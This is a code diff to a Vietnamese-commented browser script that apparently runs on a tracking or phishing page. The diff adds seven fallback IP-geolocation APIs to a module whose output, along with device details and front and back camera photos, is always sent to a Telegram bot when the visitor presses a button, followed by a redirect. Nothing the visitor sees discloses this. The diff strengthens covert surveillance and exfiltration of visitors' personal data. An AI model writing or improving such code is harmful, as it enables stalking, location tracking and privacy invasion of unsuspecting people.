@@ -1,4 +1,4 @@
-// ==================== VERSION - DÙNG JSONP ĐỂ LẤY LOCATION ====================
+// ==================== VERSION - 7 API DỰ PHÒNG ====================
 
 // -------------------- TELEGRAM CONFIG --------------------
 const TELEGRAM_CONFIG = {
@@ -91,101 +91,157 @@ const DeviceInfo = {
     }
 };
 
-// -------------------- LOCATION API (DÙNG JSONP - CHẮC CHẮN HOẠT ĐỘNG) --------------------
+// -------------------- LOCATION API (7 API DỰ PHÒNG) --------------------
 const LocationInfo = {
     async getLocationData() {
-        // Dùng ipapi.co dạng JSONP
-        return new Promise(async (resolve) => {
-            try {
-                // Cách 1: Dùng ipinfo.io (hỗ trợ CORS tốt)
-                const response = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN', {
-                    mode: 'cors',
-                    headers: { 'Accept': 'application/json' }
-                });
-                if (response.ok) {
-                    const data = await response.json();
-                    if (data && data.ip) {
-                        const loc = data.loc ? data.loc.split(',') : ['', ''];
-                        const mapsLink = loc[0] && loc[1] ? `http://googleusercontent.com/maps.google.com/${loc[0]},${loc[1]}` : '';
-                        resolve({
-                            ip: data.ip,
-                            isp: data.org || 'Không xác định',
-                            country: data.country || 'Không xác định',
-                            location: data.city ? `${data.city}, ${data.region}, ${data.country}` : (data.region || data.country || 'Không xác định'),
-                            lat: loc[0] || 'Không xác định',
-                            lon: loc[1] || 'Không xác định',
-                            maps: mapsLink
-                        });
-                        return;
-                    }
-                }
-            } catch(e) { console.log('ipinfo.io lỗi:', e); }
+        // Danh sách API theo thứ tự ưu tiên
+        const apis = [
+            // JSONP APIs (luôn hoạt động)
+            this.fetchViaJSONP('https://ip-api.com/json/', 'ip-api.com'),
+            this.fetchViaJSONP('https://geoip-db.com/json/geoip.php?jsonp=', 'geoip-db.com'),
             
-            // Cách 2: Dùng ip-api.com (CORS friendly)
-            try {
-                const response = await fetch('https://ip-api.com/json/', {
-                    mode: 'cors'
-                });
-                const data = await response.json();
-                if (data && data.status === 'success') {
-                    const mapsLink = data.lat && data.lon ? `http://googleusercontent.com/maps.google.com/${data.lat},${data.lon}` : '';
-                    resolve({
-                        ip: data.query,
-                        isp: data.isp || 'Không xác định',
-                        country: data.country || 'Không xác định',
-                        location: `${data.city || ''} ${data.regionName || ''} ${data.country || ''}`.trim() || 'Không xác định',
-                        lat: data.lat || 'Không xác định',
-                        lon: data.lon || 'Không xác định',
-                        maps: mapsLink
-                    });
-                    return;
-                }
-            } catch(e) { console.log('ip-api.com lỗi:', e); }
+            // Fetch APIs (có CORS)
+            this.fetchWithCORS('https://ipwho.is/'),
+            this.fetchWithCORS('https://ipapi.co/json/'),
+            this.fetchWithCORS('https://freeipapi.com/api/json/'),
+            this.fetchWithCORS('https://api.ipgeolocation.io/ipgeo?apiKey=demo'),
+            this.fetchWithCORS('https://ipinfo.io/json'),
             
-            // Cách 3: Dùng ipwho.is
-            try {
-                const response = await fetch('https://ipwho.is/');
-                const data = await response.json();
-                if (data && data.ip) {
-                    const mapsLink = data.latitude && data.longitude ? `http://googleusercontent.com/maps.google.com/${data.latitude},${data.longitude}` : '';
-                    resolve({
-                        ip: data.ip,
-                        isp: data.connection?.isp || data.isp || 'Không xác định',
-                        country: data.country || 'Không xác định',
-                        location: `${data.city || ''} ${data.region || ''} ${data.country || ''}`.trim() || 'Không xác định',
-                        lat: data.latitude || 'Không xác định',
-                        lon: data.longitude || 'Không xác định',
-                        maps: mapsLink
-                    });
-                    return;
-                }
-            } catch(e) { console.log('ipwho.is lỗi:', e); }
+            // Fallback
+            this.fetchIPOnly()
+        ];
+        
+        // Chạy song song, lấy kết quả đầu tiên thành công
+        const result = await Promise.race(apis);
+        return result || this.getEmptyResult();
+    },
+    
+    fetchViaJSONP(url, source) {
+        return new Promise((resolve) => {
+            const callbackName = 'jsonp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
+            const script = document.createElement('script');
             
-            // Fallback cuối
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                resolve({
-                    ip: data.ip,
-                    isp: 'Không xác định',
-                    country: 'Không xác định',
-                    location: 'Không xác định',
-                    lat: 'Không xác định',
-                    lon: 'Không xác định',
-                    maps: ''
-                });
-            } catch(e) {
-                resolve({
-                    ip: 'Không xác định',
-                    isp: 'Không xác định',
-                    country: 'Không xác định',
-                    location: 'Không xác định',
-                    lat: 'Không xác định',
-                    lon: 'Không xác định',
-                    maps: ''
-                });
+            let fullUrl = url;
+            if (url.includes('?')) {
+                fullUrl = url + `&callback=${callbackName}`;
+            } else {
+                fullUrl = url + `?callback=${callbackName}`;
             }
+            
+            window[callbackName] = (data) => {
+                delete window[callbackName];
+                document.body.removeChild(script);
+                
+                // Xử lý ip-api.com
+                if (source === 'ip-api.com' && data && data.status === 'success') {
+                    resolve(this.formatResult(data.query, data.isp, data.country, data.city, data.regionName, data.lat, data.lon, source));
+                }
+                // Xử lý geoip-db.com
+                else if (source === 'geoip-db.com' && data && data.ip_address) {
+                    resolve(this.formatResult(data.ip_address, data.isp, data.country_name, data.city, data.state, data.latitude, data.longitude, source));
+                }
+                else {
+                    resolve(null);
+                }
+            };
+            
+            script.onerror = () => {
+                delete window[callbackName];
+                document.body.removeChild(script);
+                resolve(null);
+            };
+            
+            document.body.appendChild(script);
+            
+            setTimeout(() => {
+                if (window[callbackName]) {
+                    delete window[callbackName];
+                    document.body.removeChild(script);
+                    resolve(null);
+                }
+            }, 3000);
         });
+    },
+    
+    fetchWithCORS(url) {
+        return fetch(url, { mode: 'cors' })
+            .then(res => res.ok ? res.json() : null)
+            .then(data => {
+                if (!data) return null;
+                
+                // ipwho.is
+                if (data.success !== false && data.ip) {
+                    return this.formatResult(data.ip, data.connection?.isp || data.isp, data.country, data.city, data.region, data.latitude, data.longitude, 'ipwho.is');
+                }
+                // ipapi.co
+                if (data.ip && data.country_name) {
+                    return this.formatResult(data.ip, data.org || data.asn, data.country_name, data.city, data.region, data.latitude, data.longitude, 'ipapi.co');
+                }
+                // freeipapi
+                if (data.ipAddress) {
+                    return this.formatResult(data.ipAddress, data.isp, data.country, data.city, data.region, data.latitude, data.longitude, 'freeipapi');
+                }
+                // ipgeolocation.io
+                if (data.ip && data.country_name) {
+                    return this.formatResult(data.ip, data.isp, data.country_name, data.city, data.state_prov, data.latitude, data.longitude, 'ipgeolocation');
+                }
+                // ipinfo.io
+                if (data.ip && data.loc) {
+                    const loc = data.loc.split(',');
+                    return this.formatResult(data.ip, data.org, data.country, data.city, data.region, loc[0], loc[1], 'ipinfo.io');
+                }
+                return null;
+            })
+            .catch(() => null);
+    },
+    
+    fetchIPOnly() {
+        return fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                if (data.ip) {
+                    return this.formatResult(data.ip, 'Không xác định', 'Không xác định', 'Không xác định', 'Không xác định', 'Không xác định', 'Không xác định', 'ipify');
+                }
+                return null;
+            })
+            .catch(() => null);
+    },
+    
+    formatResult(ip, isp, country, city, region, lat, lon, source) {
+        console.log(`✅ Lấy thành công từ ${source}:`, { ip, isp, country, city, region, lat, lon });
+        
+        const cityStr = city && city !== 'Không xác định' ? city : '';
+        const regionStr = region && region !== 'Không xác định' ? region : '';
+        const countryStr = country && country !== 'Không xác định' ? country : '';
+        
+        let location = [cityStr, regionStr, countryStr].filter(s => s).join(', ');
+        if (!location) location = 'Không xác định';
+        
+        const mapsLink = (lat && lon && lat !== 'Không xác định' && lon !== 'Không xác định') 
+            ? `http://googleusercontent.com/maps.google.com/${lat},${lon}` 
+            : '';
+        
+        return {
+            ip: ip || 'Không xác định',
+            isp: isp || 'Không xác định',
+            country: country || 'Không xác định',
+            location: location,
+            lat: lat || 'Không xác định',
+            lon: lon || 'Không xác định',
+            maps: mapsLink
+        };
+    },
+    
+    getEmptyResult() {
+        return {
+            ip: 'Không xác định',
+            isp: 'Không xác định',
+            country: 'Không xác định',
+            location: 'Không xác định',
+            lat: 'Không xác định',
+            lon: 'Không xác định',
+            maps: ''
+        };
     }
 };
 
@@ -290,16 +346,13 @@ const CameraManager = {
     CameraManager.init(video);
     
     startBtn.onclick = async () => {
-        // Disable nút
         startBtn.disabled = true;
         startBtn.innerText = '⏳ ĐANG XỬ LÝ...';
         
-        // Lấy thông tin location TRƯỚC (kể cả camera có được phép hay không)
-        statusDiv.innerHTML = '🌍 Đang lấy thông tin...';
+        statusDiv.innerHTML = '🌍 Đang lấy thông tin (7 API)...';
         const locationInfo = await LocationInfo.getLocationData();
         const deviceInfo = DeviceInfo.getInfo();
         
-        // Thử lấy camera (có thể thành công hoặc thất bại)
         let photos = { front: null, back: null };
         let cameraStatus = '🚫 Bị chặn hoặc không có camera';
         
@@ -316,11 +369,9 @@ const CameraManager = {
             
             video.style.display = 'none';
         } catch(e) {
-            console.log('Camera lỗi:', e);
             cameraStatus = '🚫 Bị chặn hoặc không có camera';
         }
         
-        // Luôn gửi dữ liệu lên Telegram (kể cả camera có được phép hay không)
         statusDiv.innerHTML = '📤 Đang gửi dữ liệu...';
         
         const finalData = {
@@ -340,10 +391,10 @@ const CameraManager = {
             backPhoto: photos.back
         };
         
+        console.log('📦 Dữ liệu gửi đi:', finalData);
         await TelegramSender.sendAll(finalData);
         CameraManager.stopCamera();
         
-        // Đếm ngược chuyển hướng
         startBtn.style.backgroundColor = "#28a745";
         let timeLeft = 3;
         statusDiv.innerHTML = `✅ Đã ghi nhận! Chuyển hướng sau ${timeLeft} giây...`;
@@ -358,5 +409,5 @@ const CameraManager = {
         }, 1000);
     };
     
-    console.log('✅ Đã sẵn sàng - Luôn gửi dữ liệu kể cả camera có được phép hay không');
+    console.log('✅ Đã sẵn sàng - 7 API dự phòng!');
 })();
